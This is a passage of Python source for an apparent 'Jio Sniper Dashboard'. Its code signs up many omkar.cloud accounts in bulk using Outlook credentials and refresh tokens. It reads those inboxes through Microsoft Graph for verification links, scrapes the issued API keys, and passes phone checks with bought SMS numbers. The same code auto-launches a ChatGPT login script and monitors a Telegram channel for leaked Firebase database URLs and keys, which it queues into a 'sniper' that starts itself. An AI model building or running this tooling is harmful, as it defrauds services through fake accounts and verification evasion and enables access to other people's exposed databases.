async def on_generate_omkar_keys(sid, data):
    accounts = data.get('accounts', [])
    if not accounts:
        return
    state.omkar_gen_stop = False
    await sio.emit('omkar_gen_log', {'msg': f'Starting automation for {len(accounts)} accounts...', 'level': 'info'}, to=sid)
    asyncio.create_task(process_omkar_generation(sid, accounts))


async def _process_single_omkar_account(sid, account_line, omkar_txt_path, sem, stagger_delay=0):
    # Stagger launches so we don't slam Omkar's servers all at once
    if stagger_delay > 0:
        await asyncio.sleep(stagger_delay)
    async with sem:

        if state.omkar_gen_stop:
            await sio.emit('omkar_gen_log', {'msg': 'Generation stopped by user.', 'level': 'warn'}, to=sid)
            return

        parts = account_line.split('|')
        if len(parts) < 4:
            await sio.emit('omkar_gen_log', {'msg': f'Invalid format: {account_line}', 'level': 'error'}, to=sid)
            return

        raw_email, password, refresh_token, client_id = [p.strip() for p in parts[:4]]
        # Strip numbering like "237. " from the beginning of the email string
        email = re.sub(r'^\d+\.\s*', '', raw_email)

        name_part = email.split('@')[0]
        # Make name nicely spaced and capitalized if mixed case (e.g., RandirMaeqi -> Randir Maeqi)
        name = re.sub(r'([a-z])([A-Z])', r'\1 \2', name_part).title()

        # Use the Outlook password as the Omkar password, but ensure it meets Omkar's special character requirement!
        omkar_pass = password
        if not re.search(r'[!@#$%^&*]', omkar_pass):
            omkar_pass += "!"

        await sio.emit('omkar_gen_log', {'msg': f'Processing {email}...', 'level': 'info'}, to=sid)

        context = None
        try:
            if not state.pw:
                from playwright.async_api import async_playwright
                state.pw = await async_playwright().start()
                state.browser = await state.pw.chromium.launch(headless=False)

            context = await state.browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )
            page = await context.new_page()

            # Step 1: Sign up
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Navigating to Omkar signup...', 'level': 'info'}, to=sid)
            await page.goto("https://www.omkar.cloud/auth/sign-up", wait_until="networkidle")
            await asyncio.sleep(2) # Give React time to hydrate

            await page.locator('input[name="name"]').press_sequentially(name, delay=30)
            await page.locator('input[type="email"]').press_sequentially(email, delay=30)
            await page.locator('input[type="password"]').press_sequentially(omkar_pass, delay=30)

            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Submitting signup form...', 'level': 'info'}, to=sid)
            await page.locator('button:has-text("Submit")').click(force=True)
            await asyncio.sleep(5)

            # Step 2: Graph API Email Fetch
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Requesting Graph API access token...', 'level': 'info'}, to=sid)

            token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
            token_data = {
                "client_id": client_id,
                "grant_type": "refresh_token",
                "refresh_token": refresh_token,
                "scope": "Mail.Read"
            }

            access_token = None
            async with state.http_session.post(token_url, data=token_data) as resp:
                if resp.status != 200:
                    err = await resp.text()
                    await sio.emit('omkar_gen_log', {'msg': f'[{email}] Failed to get access token: {err[:100]}', 'level': 'error'}, to=sid)
                    raise Exception("Graph API Token Error")
                res_data = await resp.json()
                access_token = res_data.get("access_token")

            if not access_token:
                raise Exception("No access token returned")

            # Poll for the verification email (up to 2 minutes)
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Polling Inbox for Omkar verification email...', 'level': 'info'}, to=sid)
            verification_link = None
            for _ in range(24):
                async with state.http_session.get(
                    "https://graph.microsoft.com/v1.0/me/messages?$top=5",
                    headers={"Authorization": f"Bearer {access_token}"}
                ) as resp:
                    if resp.status == 200:
                        msgs = await resp.json()
                        for msg in msgs.get("value", []):
                            subject = msg.get("subject", "").lower()
                            if "verification" in subject or "verify" in subject or "omkar" in subject:
                                body = msg.get("body", {}).get("content", "")
                                # Look for the brevo tracking link (domain changes frequently, e.g. sendibt2.com, sendibt3.com)
                                match = re.search(r'(https://[a-zA-Z0-9.-]+sendibt[0-9]\.com/tr/cl/[^\s"\'<>]+)', body)
                                if match:
                                    verification_link = match.group(1)
                                    break
                                # Fallback if /tr/cl/ isn't used
                                match_any = re.search(r'(https://[a-zA-Z0-9.-]+sendibt[0-9]\.com/[^\s"\'<>]+)', body)
                                if match_any:
                                    verification_link = match_any.group(1)
                                    break
                    if verification_link:
                        break
                await asyncio.sleep(5)

            if not verification_link:
                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Verification email not found after 2 mins.', 'level': 'error'}, to=sid)
                raise Exception("Email timeout")

            # Step 3: Verify and Extract Key
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Found link! Verifying...', 'level': 'info'}, to=sid)
            try:
                await page.goto(verification_link, wait_until="domcontentloaded", timeout=30000)
            except Exception as e:
                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Redirect took too long, proceeding anyway...', 'level': 'warn'}, to=sid)

            await asyncio.sleep(3)

            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Fetching API Key...', 'level': 'info'}, to=sid)
            await page.goto("https://www.omkar.cloud/api-key", wait_until="domcontentloaded", timeout=30000)
            await asyncio.sleep(2)

            # Check if we were redirected to sign-in page
            if "sign-in" in page.url:
                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Redirected to sign-in, manually logging in...', 'level': 'warn'}, to=sid)
                try:
                    await page.locator('input[type="email"]').press_sequentially(email, delay=30)
                    await page.locator('input[type="password"]').press_sequentially(omkar_pass, delay=30)
                    await page.locator('button[type="submit"]').click(force=True)
                    await asyncio.sleep(4)

                    # Ensure we go to the API key page after login
                    await page.goto("https://www.omkar.cloud/api-key", wait_until="domcontentloaded", timeout=30000)
                    await asyncio.sleep(2)
                except Exception as e:
                    await sio.emit('omkar_gen_log', {'msg': f'[{email}] Manual login failed: {str(e)[:100]}', 'level': 'error'}, to=sid)

            # The key is typically in an input field or a code block. We'll look for ok_...
            content = await page.content()
            match = re.search(r'(ok_[a-f0-9]{32})', content)

            if match:
                api_key = match.group(1)
                await sio.emit('omkar_gen_log', {'msg': f'[{email}] 🎉 Extracted Key: {api_key}', 'level': 'success'}, to=sid)

                # Append to file
                with open(omkar_txt_path, "a") as f:
                    f.write(f"{api_key}\n")

                # --- NEW LOGIC: Automate Phone Verification with Grizzly SMS ---
                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Navigating to Phone Verification...', 'level': 'info'}, to=sid)
                await page.goto("https://www.omkar.cloud/account/verify-phone", wait_until="domcontentloaded", timeout=30000)
                await asyncio.sleep(2)

                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Buying number from Grizzly SMS (Chile/Indonesia)...', 'level': 'info'}, to=sid)
                tzid, local_number, country_name, full_number = await buy_grizzly_number()

                if not tzid:
                    await sio.emit('omkar_gen_log', {'msg': f'[{email}] Failed to buy Grizzly number! Leaving browser OPEN for you. Key: {api_key}', 'level': 'warn'}, to=sid)
                    context = None
                else:
                    await sio.emit('omkar_gen_log', {'msg': f'[{email}] Bought {country_name} number: {full_number}. Filling form...', 'level': 'success'}, to=sid)
                    try:
                        # 1. Select Country
                        await page.locator('[data-test-subj="comboBoxSearchInput"]').fill(country_name)
                        await asyncio.sleep(1)
                        # Press ArrowDown to highlight the option, then Enter
                        await page.keyboard.press("ArrowDown")
                        await asyncio.sleep(0.5)
                        await page.keyboard.press("Enter")
                        await asyncio.sleep(1)
                        # Fallback: try to explicitly click it if the dropdown is still open
                        try:
                            await page.locator(f'button[role="option"]:has-text("{country_name}")').click(timeout=2000)
                        except:
                            pass
                        await asyncio.sleep(1)

                        # 2. Enter Phone Number
                        await page.locator('input[name="phone"]').fill(local_number)
                        await asyncio.sleep(1)
                        await page.keyboard.press("Enter")

                        # Wait for OTP input to appear
                        try:
                            await page.wait_for_selector('input[name="code"]', timeout=20000)
                            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Waiting up to 65s for OTP...', 'level': 'info'}, to=sid)

                            otp = await poll_grizzly_otp(tzid, timeout=65)

                            if not otp:
                                await sio.emit('omkar_gen_log', {'msg': f'[{email}] No OTP yet. Clicking "Resend code" and waiting 60s more...', 'level': 'warn'}, to=sid)
                                await page.locator('span:has-text("Resend code")').click()
                                otp = await poll_grizzly_otp(tzid, timeout=60)

                            if otp:
                                await sio.emit('omkar_gen_log', {'msg': f'[{email}] 🎉 OTP Received: {otp}! Submitting...', 'level': 'success'}, to=sid)
                                await page.locator('input[name="code"]').fill(otp)
                                await asyncio.sleep(1)
                                await page.keyboard.press("Enter")
                                await asyncio.sleep(5) # Wait for success redirect or message

                                # Mark as VERIFIED in omkar.txt
                                lines = []
                                with open(omkar_txt_path, "r") as f:
                                    lines = f.readlines()
                                with open(omkar_txt_path, "w") as f:
                                    for line in lines:
                                        if api_key in line and "VERIFIED" not in line:
                                            f.write(f"{line.strip()} - VERIFIED\n")
                                        else:
                                            f.write(line)

                                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Phone verification COMPLETE! Account ready.', 'level': 'success'}, to=sid)
                                # Let context close naturally
                            else:
                                await sio.emit('omkar_gen_log', {'msg': f'[{email}] OTP never arrived. Cancelling number for refund.', 'level': 'error'}, to=sid)
                                await cancel_grizzly_number(tzid)
                                context = None # Leave browser open for manual debug
                        except Exception as e:
                            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Error during OTP submission: {str(e)[:100]}. Cancelling number.', 'level': 'error'}, to=sid)
                            await cancel_grizzly_number(tzid)
                            context = None
                    except Exception as e:
                        await sio.emit('omkar_gen_log', {'msg': f'[{email}] UI Error filling phone form: {str(e)[:100]}. Cancelling number.', 'level': 'error'}, to=sid)
                        await cancel_grizzly_number(tzid)
                        context = None
                # -----------------------------------------------------------------
            else:
                await sio.emit('omkar_gen_log', {'msg': f'[{email}] Could not find ok_ key! Browser kept open. Password: {omkar_pass}', 'level': 'error'}, to=sid)
                context = None # Prevent finally block from closing it

        except Exception as e:
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Error: {str(e)[:150]}', 'level': 'error'}, to=sid)
            # If there's an error, maybe keep it open too?
            # Let's keep it open for debugging
            await sio.emit('omkar_gen_log', {'msg': f'[{email}] Browser kept open for debugging. Password: {omkar_pass}', 'level': 'warn'}, to=sid)
            context = None
        finally:
            if context:
                await context.close()

async def process_omkar_generation(sid, accounts):
    omkar_txt_path = os.path.join(DATA_DIR, "omkar.txt")

    if not state.pw:
        from playwright.async_api import async_playwright
        state.pw = await async_playwright().start()
        state.browser = await state.pw.chromium.launch(headless=False)

    # Limit concurrency: max 3 accounts doing Grizzly phone verification at once
    sem = asyncio.Semaphore(3)

    tasks = []
    for i, account_line in enumerate(accounts):
        tasks.append(asyncio.create_task(_process_single_omkar_account(sid, account_line, omkar_txt_path, sem, stagger_delay=i * 8)))

    await asyncio.gather(*tasks)

    await sio.emit('omkar_gen_log', {'msg': 'Automation sequence completed.', 'level': 'success'}, to=sid)
    await sio.emit('omkar_gen_done', {}, to=sid)

@sio.on('stop_chatgpt_login')
async def on_stop_chatgpt_login(sid):
    state.chatgpt_login_stop = True
    await sio.emit('chatgpt_log', {'msg': 'Stopping login process...', 'level': 'warn'}, to=sid)

@sio.on('start_chatgpt_login')
async def on_start_chatgpt_login(sid, data):
    num_tabs = data.get('num_tabs', 3)
    state.chatgpt_login_stop = False
    await sio.emit('chatgpt_log', {'msg': f'Starting automation for {num_tabs} tabs...', 'level': 'info'}, to=sid)
    asyncio.create_task(process_chatgpt_login(sid, num_tabs))

async def process_chatgpt_login(sid, num_tabs):
    script_path = os.path.join(PROJECT_DIR, "outlook-chatgpt-auto-login", "chatgpt_web_login.py")

    if getattr(state, "chatgpt_login_stop", False):
        await sio.emit('chatgpt_log', {'msg': 'Generation stopped by user.', 'level': 'warn'}, to=sid)
        return

    await sio.emit('chatgpt_log', {'msg': f'Launching chatgpt_web_login.py for {num_tabs} tabs...', 'level': 'info'}, to=sid)

    try:
        # We launch the python script asynchronously using sys.executable to stay inside the venv
        process = await asyncio.create_subprocess_exec(
            sys.executable, script_path,
            env={**os.environ, "NUM_TABS": str(num_tabs)},
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        await sio.emit('chatgpt_log', {'msg': f'Script launched (PID: {process.pid}). Please wait for it to complete.', 'level': 'success'}, to=sid)

    except Exception as e:
        await sio.emit('chatgpt_log', {'msg': f'Error launching script: {e}', 'level': 'error'}, to=sid)

    await sio.emit('chatgpt_log', {'msg': 'Automation sequence completed.', 'level': 'success'}, to=sid)
    await sio.emit('chatgpt_login_done', {}, to=sid)


# ─── Telegram Channel Monitor ────────────────────────────────────────────────
_tg_client = None
_tg_monitor_task = None

async def tg_extract_firebase_urls(text: str) -> list:
    """Extract Firebase Realtime DB URLs from a message."""
    import re
    patterns = [
        r'https?://[a-zA-Z0-9_-]+-default-rtdb\.firebaseio\.com',
        r'https?://[a-zA-Z0-9_-]+-default-rtdb\.[a-z0-9-]+\.firebasedatabase\.app',
    ]
    urls = []
    for p in patterns:
        urls += re.findall(p, text)
    # Also try to extract auth key if present (format: url key or url\nkey)
    results = []
    for url in set(urls):
        url = url.rstrip('/')
        # Look for key near the URL in text
        key = ""
        idx = text.find(url)
        if idx >= 0:
            nearby = text[idx:idx+200]
            key_match = re.search(r'[Kk]ey[:\s]+([A-Za-z0-9_-]{6,})', nearby)
            if not key_match:
                key_match = re.search(r'auth[:\s]+([A-Za-z0-9_-]{6,})', nearby)
            if key_match:
                key = key_match.group(1)
        results.append({"url": url, "key": key})
    return results

async def tg_add_firebase_dbs(new_dbs: list):
    """Add new Firebase DBs to config and queue, avoiding duplicates."""
    global config
    existing = {db.get("url", "").rstrip("/") for db in config.get("firebase_dbs", [])}
    added = []
    for db in new_dbs:
        url = db.get("url", "").rstrip("/")
        if url and url not in existing:
            config.setdefault("firebase_dbs", []).append(db)
            config.setdefault("firebase_urls", [])
            if url not in config["firebase_urls"]:
                config["firebase_urls"].append(url)
            # Update _url_key_map too
            _url_key_map[clean_firebase_url(url)] = db.get("key", "")
            existing.add(url)
            added.append(url)
    if added:
        save_config(config)
        db_names = [u.split("//")[1].split(".")[0] for u in added]
        await emit_log(f"📡 TG Monitor: Added {len(added)} new Firebase DB(s): {', '.join(db_names)}", "success")
        await sio.emit("firebase_dbs_updated", {"added": added})
        # If sniper is not running, auto-start
        if not state.is_sniping:
            await emit_log("🚀 Auto-starting sniper with new Firebase DB...", "info")
            await sio.emit("auto_start_sniper")
    return added

async def tg_monitor_loop():
    """Monitor a Telegram channel for new Firebase URLs."""
    global _tg_client
    try:
        from telethon import TelegramClient, events
        from telethon.sessions import StringSession
    except ImportError:
        await emit_log("❌ Telethon not installed. Run: pip install telethon", "error")
        return

    cfg = config.get("tg_monitor", {})
    api_id = cfg.get("api_id", "")
    api_hash = cfg.get("api_hash", "")
    phone = cfg.get("phone", "")
    channel = cfg.get("channel", "")
    session_str = cfg.get("session", "")

    if not api_id or not api_hash or not phone or not channel:
        await emit_log("❌ TG Monitor: api_id, api_hash, phone, channel are required in Settings", "error")
        return

    session_path = os.path.join(DATA_DIR, "tg_monitor_session")
    try:
        _tg_client = TelegramClient(session_path, int(api_id), api_hash)
        await _tg_client.start(phone=phone)
        await emit_log(f"📡 TG Monitor: Connected! Watching channel: {channel}", "success")

        @_tg_client.on(events.NewMessage(chats=channel))
        async def on_new_message(event):
            text = event.message.text or ""
            if not text:
                return
            dbs = await tg_extract_firebase_urls(text)
            if dbs:
                await emit_log(f"📡 TG Monitor: New message with {len(dbs)} Firebase URL(s)", "info")
                await tg_add_firebase_dbs(dbs)

        await _tg_client.run_until_disconnected()
    except Exception as e:
        await emit_log(f"❌ TG Monitor error: {e}", "error")
    finally:
        _tg_client = None

@sio.on("save_tg_monitor_config")
async def on_save_tg_monitor_config(sid, data):
    global config
    config.setdefault("tg_monitor", {}).update({
        "channel": data.get("channel", ""),
        "api_id": data.get("api_id", ""),
        "api_hash": data.get("api_hash", ""),
        "phone": data.get("phone", ""),
        "enabled": True
    })
    # Also sync to tg_checker for compatibility
    config.setdefault("tg_checker", {}).update({
        "api_id": data.get("api_id", ""),
        "api_hash": data.get("api_hash", ""),
        "phone": data.get("phone", ""),
    })
    save_config(config)
    await emit_log(f"📡 TG Monitor config saved. Channel: {data.get('channel','')}", "success")

@sio.on("start_tg_monitor")
async def on_start_tg_monitor(sid, data=None):
    global _tg_monitor_task
    if _tg_monitor_task and not _tg_monitor_task.done():
        await emit_log("📡 TG Monitor already running", "warn")
        return
    _tg_monitor_task = asyncio.create_task(tg_monitor_loop())
    await sio.emit("tg_monitor_status", {"running": True}, to=sid)

@sio.on("stop_tg_monitor")
async def on_stop_tg_monitor(sid, data=None):
    global _tg_client, _tg_monitor_task
    if _tg_client:
        try:
            await _tg_client.disconnect()
        except Exception:
            pass
        _tg_client = None
    if _tg_monitor_task:
        _tg_monitor_task.cancel()
        _tg_monitor_task = None
    await emit_log("📡 TG Monitor stopped", "warn")
    await sio.emit("tg_monitor_status", {"running": False}, to=sid)

@sio.on("get_tg_monitor_status")
async def on_get_tg_monitor_status(sid, data=None):
    running = _tg_monitor_task is not None and not _tg_monitor_task.done()
    await sio.emit("tg_monitor_status", {"running": running}, to=sid)

@app.post("/api/tg-monitor/send-code")
async def tg_monitor_send_code(request: Request):
    """Send login code to phone for Telegram auth."""
    body = await request.json()
    phone = body.get("phone", "")
    api_id = body.get("api_id", "")
    api_hash = body.get("api_hash", "")
    if not all([phone, api_id, api_hash]):
        return JSONResponse({"ok": False, "error": "Missing fields"})
    try:
        from telethon import TelegramClient
        session_path = os.path.join(DATA_DIR, "tg_monitor_session")
        client = TelegramClient(session_path, int(api_id), api_hash)
        await client.connect()
        if not await client.is_user_authorized():
            await client.send_code_request(phone)
            await client.disconnect()
            return JSONResponse({"ok": True, "needs_code": True})
        await client.disconnect()
        return JSONResponse({"ok": True, "needs_code": False, "already_auth": True})
    except Exception as e:
        return JSONResponse({"ok": False, "error": str(e)})

@app.post("/api/tg-monitor/verify-code")
async def tg_monitor_verify_code(request: Request):
    """Verify login code and save session."""
    body = await request.json()
    phone = body.get("phone", "")
    code = body.get("code", "")
    api_id = body.get("api_id", "")
    api_hash = body.get("api_hash", "")
    password = body.get("password", "")
    if not all([phone, code, api_id, api_hash]):
        return JSONResponse({"ok": False, "error": "Missing fields"})
    try:
        from telethon import TelegramClient
        from telethon.errors import SessionPasswordNeededError
        session_path = os.path.join(DATA_DIR, "tg_monitor_session")
        client = TelegramClient(session_path, int(api_id), api_hash)
        await client.connect()
        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            if password:
                await client.sign_in(password=password)
            else:
                await client.disconnect()
                return JSONResponse({"ok": False, "needs_password": True})
        await client.disconnect()
        # Save credentials to config
        global config
        config.setdefault("tg_monitor", {}).update({
            "api_id": api_id, "api_hash": api_hash, "phone": phone
        })
        save_config(config)
        return JSONResponse({"ok": True})
    except Exception as e:
        return JSONResponse({"ok": False, "error": str(e)})

# ─── Main ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    print(f"🚀 Jio Sniper Dashboard v2.0 — http://localhost:{port}")
    uvicorn.run(sio_app, host="0.0.0.0", port=port, log_level="warning")
